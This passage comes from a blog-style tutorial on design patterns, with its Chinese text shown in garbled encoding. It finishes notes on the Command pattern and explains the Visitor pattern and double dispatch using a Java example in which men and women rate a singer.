href="#å‘½ä»¤æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> å‘½ä»¤æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>å°†å‘èµ·è¯·æ±‚çš„å¯¹è±¡ä¸æ‰§è¡Œè¯·æ±‚çš„å¯¹è±¡è§£è€¦ã€‚å‘èµ·è¯·æ±‚çš„å¯¹è±¡æ˜¯è°ƒç”¨è€…ï¼Œè°ƒç”¨è€…åªè¦è°ƒç”¨å‘½ä»¤å¯¹è±¡çš„ execute()æ–¹æ³•å°±å¯ä»¥è®©æ¥æ”¶è€…å·¥ä½œï¼Œè€Œä¸å¿…çŸ¥é“å…·ä½“çš„æ¥æ”¶è€…å¯¹è±¡æ˜¯è°ã€æ˜¯å¦‚ä½•å®ç°çš„ï¼Œå‘½ä»¤å¯¹è±¡ä¼šè´Ÿè´£è®©æ¥æ”¶è€…æ‰§è¡Œè¯·æ±‚çš„åŠ¨ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šâ€è¯·æ±‚å‘èµ·è€…â€å’Œâ€œè¯·æ±‚æ‰§è¡Œè€…â€ä¹‹é—´çš„è§£è€¦æ˜¯é€šè¿‡å‘½ä»¤å¯¹è±¡å®ç°çš„ï¼Œå‘½ä»¤å¯¹è±¡èµ·åˆ°äº†çº½å¸¦æ¡¥æ¢çš„ä½œç”¨ã€‚</p></li><li><p>å®¹æ˜“è®¾è®¡ä¸€ä¸ªå‘½ä»¤é˜Ÿåˆ—ã€‚åªè¦æŠŠå‘½ä»¤å¯¹è±¡æ”¾åˆ°åˆ—é˜Ÿï¼Œå°±å¯ä»¥å¤šçº¿ç¨‹çš„æ‰§è¡Œå‘½ä»¤</p></li><li><p>å®¹æ˜“å®ç°å¯¹è¯·æ±‚çš„æ’¤é”€å’Œé‡åš</p></li><li><p><strong>å‘½ä»¤æ¨¡å¼ä¸è¶³</strong>ï¼šå¯èƒ½å¯¼è‡´æŸäº›ç³»ç»Ÿæœ‰è¿‡å¤šçš„å…·ä½“å‘½ä»¤ç±»ï¼Œå¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œè¿™ç‚¹åœ¨åœ¨ä½¿ç”¨çš„æ—¶å€™è¦æ³¨æ„</p></li><li><p><strong>ç©ºå‘½ä»¤ä¹Ÿæ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼</strong>ï¼Œå®ƒä¸ºæˆ‘ä»¬<strong>çœå»äº†åˆ¤ç©ºçš„æ“ä½œ</strong>ã€‚åœ¨ä¸Šé¢çš„å®ä¾‹ä¸­ï¼Œå¦‚æœæ²¡æœ‰ç”¨ç©ºå‘½ä»¤ï¼Œæˆ‘ä»¬æ¯æŒ‰ä¸‹ä¸€ä¸ªæŒ‰é”®éƒ½è¦åˆ¤ç©ºï¼Œè¿™ç»™æˆ‘ä»¬ç¼–ç å¸¦æ¥ä¸€å®šçš„éº»çƒ¦ã€‚</p></li><li><p>å‘½ä»¤æ¨¡å¼ç»å…¸çš„åº”ç”¨åœºæ™¯ï¼šç•Œé¢çš„ä¸€ä¸ªæŒ‰é’®éƒ½æ˜¯ä¸€æ¡å‘½ä»¤ã€æ¨¡æ‹Ÿ CMDï¼ˆDOS å‘½ä»¤ï¼‰è®¢å•çš„æ’¤é”€/æ¢å¤ã€è§¦å‘-åé¦ˆæœºåˆ¶</p></li></ol><h1 id="è®¿é—®è€…æ¨¡å¼"><a class="markdownIt-Anchor" href="#è®¿é—®è€…æ¨¡å¼"></a> è®¿é—®è€…æ¨¡å¼</h1><p>åœ¨è®¿é—®è€…æ¨¡å¼ï¼ˆVisitor Patternï¼‰ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªè®¿é—®è€…ç±»ï¼Œå®ƒæ”¹å˜äº†å…ƒç´ ç±»çš„æ‰§è¡Œç®—æ³•ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå…ƒç´ çš„æ‰§è¡Œç®—æ³•å¯ä»¥éšç€è®¿é—®è€…æ”¹å˜è€Œæ”¹å˜ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚æ ¹æ®æ¨¡å¼ï¼Œå…ƒç´ å¯¹è±¡å·²æ¥å—è®¿é—®è€…å¯¹è±¡ï¼Œè¿™æ ·è®¿é—®è€…å¯¹è±¡å°±å¯ä»¥å¤„ç†å…ƒç´ å¯¹è±¡ä¸Šçš„æ“ä½œã€‚</p><h2 id="ä»‹ç»-14"><a class="markdownIt-Anchor" href="#ä»‹ç»-14"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ä¸»è¦å°†æ•°æ®ç»“æ„ä¸æ•°æ®æ“ä½œåˆ†ç¦»ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ç¨³å®šçš„æ•°æ®ç»“æ„å’Œæ˜“å˜çš„æ“ä½œè€¦åˆé—®é¢˜ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> éœ€è¦å¯¹ä¸€ä¸ªå¯¹è±¡ç»“æ„ä¸­çš„å¯¹è±¡è¿›è¡Œå¾ˆå¤šä¸åŒçš„å¹¶ä¸”ä¸ç›¸å…³çš„æ“ä½œï¼Œè€Œéœ€è¦é¿å…è®©è¿™äº›æ“ä½œ&quot;æ±¡æŸ“&quot;è¿™äº›å¯¹è±¡çš„ç±»ï¼Œä½¿ç”¨è®¿é—®è€…æ¨¡å¼å°†è¿™äº›å°è£…åˆ°ç±»ä¸­ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> åœ¨è¢«è®¿é—®çš„ç±»é‡Œé¢åŠ ä¸€ä¸ªå¯¹å¤–æä¾›æ¥å¾…è®¿é—®è€…çš„æ¥å£ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> åœ¨æ•°æ®åŸºç¡€ç±»é‡Œé¢æœ‰ä¸€ä¸ªæ–¹æ³•æ¥å—è®¿é—®è€…ï¼Œå°†è‡ªèº«å¼•ç”¨ä¼ å…¥è®¿é—®è€…ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> æ‚¨åœ¨æœ‹å‹å®¶åšå®¢ï¼Œæ‚¨æ˜¯è®¿é—®è€…ï¼Œæœ‹å‹æ¥å—æ‚¨çš„è®¿é—®ï¼Œæ‚¨é€šè¿‡æœ‹å‹çš„æè¿°ï¼Œç„¶åå¯¹æœ‹å‹çš„æè¿°åšå‡ºä¸€ä¸ªåˆ¤æ–­ï¼Œè¿™å°±æ˜¯è®¿é—®è€…æ¨¡å¼ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€ç¬¦åˆå•ä¸€èŒè´£åŸåˆ™ã€‚ 2ã€ä¼˜ç§€çš„æ‰©å±•æ€§ã€‚ 3ã€çµæ´»æ€§ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€å…·ä½“å…ƒç´ å¯¹è®¿é—®è€…å…¬å¸ƒç»†èŠ‚ï¼Œè¿åäº†è¿ªç±³ç‰¹åŸåˆ™ã€‚ 2ã€å…·ä½“å…ƒç´ å˜æ›´æ¯”è¾ƒå›°éš¾ã€‚ 3ã€è¿åäº†ä¾èµ–å€’ç½®åŸåˆ™ï¼Œä¾èµ–äº†å…·ä½“ç±»ï¼Œæ²¡æœ‰ä¾èµ–æŠ½è±¡ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€å¯¹è±¡ç»“æ„ä¸­å¯¹è±¡å¯¹åº”çš„ç±»å¾ˆå°‘æ”¹å˜ï¼Œä½†ç»å¸¸éœ€è¦åœ¨æ­¤å¯¹è±¡ç»“æ„ä¸Šå®šä¹‰æ–°çš„æ“ä½œã€‚<br />2ã€éœ€è¦å¯¹ä¸€ä¸ªå¯¹è±¡ç»“æ„ä¸­çš„å¯¹è±¡è¿›è¡Œå¾ˆå¤šä¸åŒçš„å¹¶ä¸”ä¸ç›¸å…³çš„æ“ä½œï¼Œè€Œéœ€è¦é¿å…è®©è¿™äº›æ“ä½œ&quot;æ±¡æŸ“&quot;è¿™äº›å¯¹è±¡çš„ç±»ï¼Œä¹Ÿä¸å¸Œæœ›åœ¨å¢åŠ æ–°æ“ä½œæ—¶ä¿®æ”¹è¿™äº›ç±»ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> è®¿é—®è€…å¯ä»¥å¯¹åŠŸèƒ½è¿›è¡Œç»Ÿä¸€ï¼Œå¯ä»¥åšæŠ¥è¡¨ã€UIã€æ‹¦æˆªå™¨ä¸è¿‡æ»¤å™¨ã€‚</p><p><strong>è®¿é—®è€…æ¨¡å¼çš„åŸç†ç±»å›¾:</strong><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103191915903.png" alt="image-20230103191915903" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(è®¿é—®è€…æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>Visitor æ˜¯æŠ½è±¡è®¿é—®è€…ï¼Œä¸ºè¯¥å¯¹è±¡ç»“æ„ä¸­çš„ ConcreteElement çš„æ¯ä¸€ä¸ªç±»å£°æ˜ä¸€ä¸ª visit æ“ä½œ</p></li><li><p>ConcreteVisitor ï¼šæ˜¯ä¸€ä¸ªå…·ä½“çš„è®¿é—®å€¼ å®ç°æ¯ä¸ªæœ‰ Visitor å£°æ˜çš„æ“ä½œï¼Œæ˜¯æ¯ä¸ªæ“ä½œå®ç°çš„éƒ¨åˆ†.</p></li><li><p>ObjectStructure èƒ½æšä¸¾å®ƒçš„å…ƒç´ ï¼Œ å¯ä»¥æä¾›ä¸€ä¸ªé«˜å±‚çš„æ¥å£ï¼Œç”¨æ¥å…è®¸è®¿é—®è€…è®¿é—®å…ƒç´ </p></li><li><p>Element å®šä¹‰ä¸€ä¸ª accept æ–¹æ³•ï¼Œæ¥æ”¶ä¸€ä¸ªè®¿é—®è€…å¯¹è±¡</p></li><li><p>ConcreteElement ä¸ºå…·ä½“å…ƒç´ ï¼Œå®ç°äº† accept æ–¹æ³•</p></li></ol><h2 id="å®ç°-12"><a class="markdownIt-Anchor" href="#å®ç°-12"></a> å®ç°</h2><p>å®Œæˆæµ‹è¯„ç³»ç»Ÿéœ€æ±‚</p><ol><li>å°†è§‚ä¼—åˆ†ä¸ºç”·äººå’Œå¥³äººï¼Œå¯¹æ­Œæ‰‹è¿›è¡Œæµ‹è¯„ï¼Œå½“çœ‹å®ŒæŸä¸ªæ­Œæ‰‹è¡¨æ¼”åï¼Œå¾—åˆ°ä»–ä»¬å¯¹è¯¥æ­Œæ‰‹ä¸åŒçš„è¯„ä»·(è¯„ä»· æœ‰ä¸åŒçš„ç§ç±»ï¼Œæ¯”å¦‚ æˆåŠŸã€å¤±è´¥ ç­‰)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103191809297.png" alt="image-20230103191809297" /></p><p><code>Action.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Action</span> &#123;<br>   <br>   <span class="hljs-comment">//å¾—åˆ°ç”·æ€§ çš„æµ‹è¯„</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span>;<br>   <br>   <span class="hljs-comment">//å¾—åˆ°å¥³çš„ æµ‹è¯„</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºObjectStructure</span><br>      <span class="hljs-type">ObjectStructure</span> <span class="hljs-variable">objectStructure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectStructure</span>();<br>      <br>      objectStructure.attach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Man</span>());<br>      objectStructure.attach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Woman</span>());<br>      <br>      <br>      <span class="hljs-comment">//æˆåŠŸ</span><br>      <span class="hljs-type">Success</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Success</span>();<br>      objectStructure.display(success);<br>      <br>      System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~~~~~~~~~~~~~~~~&quot;</span>);<br>      <span class="hljs-type">Fail</span> <span class="hljs-variable">fail</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fail</span>();<br>      objectStructure.display(fail);<br>      <br>      System.out.println(<span class="hljs-string">&quot;~~~~~~~~~~~ç»™çš„æ˜¯å¾…å®šçš„æµ‹è¯„~~~~~~~~~~~&quot;</span>);<br>      <br>      <span class="hljs-type">Wait</span> <span class="hljs-variable">wait</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Wait</span>();<br>      objectStructure.display(wait);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Fail.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fail</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç”·äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¤±è´¥ !&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; å¥³äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¤±è´¥ !&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Man.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Man</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Action action)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      action.getManResult(<span class="hljs-built_in">this</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ObjectStructure.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">import</span> java.util.LinkedList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//æ•°æ®ç»“æ„ï¼Œç®¡ç†å¾ˆå¤šäººï¼ˆMan , Womanï¼‰</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectStructure</span> &#123;<br><br>   <span class="hljs-comment">//ç»´æŠ¤äº†ä¸€ä¸ªé›†åˆ</span><br>   <span class="hljs-keyword">private</span> List&lt;Person&gt; persons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>   <br>   <span class="hljs-comment">//å¢åŠ åˆ°list</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">(Person p)</span> &#123;<br>      persons.add(p);<br>   &#125;<br>   <span class="hljs-comment">//ç§»é™¤</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detach</span><span class="hljs-params">(Person p)</span> &#123;<br>      persons.remove(p);<br>   &#125;<br>   <br>   <span class="hljs-comment">//æ˜¾ç¤ºæµ‹è¯„æƒ…å†µ</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">(Action action)</span> &#123;<br>      <span class="hljs-keyword">for</span>(Person p: persons) &#123;<br>         p.accept(action);<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Person.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <br>   <span class="hljs-comment">//æä¾›ä¸€ä¸ªæ–¹æ³•ï¼Œè®©è®¿é—®è€…å¯ä»¥è®¿é—®</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Action action)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Success.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Success</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç”·äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¾ˆæˆåŠŸ !&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; å¥³äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¾ˆæˆåŠŸ !&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Wait.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Wait</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getManResult</span><span class="hljs-params">(Man man)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ç”·äººç»™çš„è¯„ä»·æ˜¯è¯¥æ­Œæ‰‹å¾…å®š ..&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getWomanResult</span><span class="hljs-params">(Woman woman)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; å¥³äººç»™çš„è¯„ä»·æ˜¯è¯¥æ­Œæ‰‹å¾…å®š ..&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Woman.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.visitor;<br><br><span class="hljs-comment">//è¯´æ˜</span><br><span class="hljs-comment">//1. è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åˆ°äº†åŒåˆ†æ´¾, å³é¦–å…ˆåœ¨å®¢æˆ·ç«¯ç¨‹åºä¸­ï¼Œå°†å…·ä½“çŠ¶æ€ä½œä¸ºå‚æ•°ä¼ é€’Womanä¸­(ç¬¬ä¸€æ¬¡åˆ†æ´¾)</span><br><span class="hljs-comment">//2. ç„¶åWoman ç±»è°ƒç”¨ä½œä¸ºå‚æ•°çš„ &quot;å…·ä½“æ–¹æ³•&quot; ä¸­æ–¹æ³•getWomanResult, åŒæ—¶å°†è‡ªå·±(this)ä½œä¸ºå‚æ•°</span><br><span class="hljs-comment">//   ä¼ å…¥ï¼Œå®Œæˆç¬¬äºŒæ¬¡çš„åˆ†æ´¾</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Woman</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Action action)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      action.getWomanResult(<span class="hljs-built_in">this</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> ç”·äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¾ˆæˆåŠŸ !</span><br><span class="hljs-section"> å¥³äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¾ˆæˆåŠŸ !</span><br><span class="hljs-section">~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-code"> ç”·äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¤±è´¥ !</span><br><span class="hljs-code"> å¥³äººç»™çš„è¯„ä»·è¯¥æ­Œæ‰‹å¤±è´¥ !</span><br>~~~~~~~~~~~ç»™çš„æ˜¯å¾…å®šçš„æµ‹è¯„~~~~~~~~~~~<br><span class="hljs-code"> ç”·äººç»™çš„è¯„ä»·æ˜¯è¯¥æ­Œæ‰‹å¾…å®š ..</span><br><span class="hljs-code"> å¥³äººç»™çš„è¯„ä»·æ˜¯è¯¥æ­Œæ‰‹å¾…å®š ..</span><br></code></pre></td></tr></table></figure><blockquote><p>åº”ç”¨æ¡ˆä¾‹çš„å°ç»“-åŒåˆ†æ´¾</p></blockquote><ol><li><p>ä¸Šé¢æåˆ°äº†åŒåˆ†æ´¾ï¼Œæ‰€è°“åŒåˆ†æ´¾æ˜¯æŒ‡ä¸ç®¡ç±»æ€ä¹ˆå˜åŒ–ï¼Œæˆ‘ä»¬éƒ½èƒ½æ‰¾åˆ°æœŸæœ›çš„æ–¹æ³•è¿è¡Œã€‚åŒåˆ†æ´¾æ„å‘³ç€å¾—åˆ°æ‰§è¡Œçš„æ“ä½œå–å†³äºè¯·æ±‚çš„ç§ç±»å’Œä¸¤ä¸ªæ¥æ”¶è€…çš„ç±»å‹</p></li><li><p>ä»¥ä¸Šè¿°å®ä¾‹ä¸ºä¾‹ï¼Œ<strong>å‡è®¾æˆ‘ä»¬è¦æ·»åŠ ä¸€ä¸ª Wait çš„çŠ¶æ€ç±»ï¼Œè€ƒå¯Ÿ Man ç±»å’Œ Woman ç±»çš„ååº”</strong>ï¼Œç”±äºä½¿ç”¨äº†åŒåˆ†æ´¾ï¼Œåªéœ€å¢åŠ ä¸€ä¸ª Action å­ç±»å³å¯åœ¨å®¢æˆ·ç«¯è°ƒç”¨å³å¯ï¼Œ<strong>ä¸éœ€è¦æ”¹åŠ¨ä»»ä½•å…¶ä»–ç±»çš„ä»£ç </strong>ã€‚</p></li></ol><h2 id="è®¿é—®è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#è®¿é—®è€…æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> 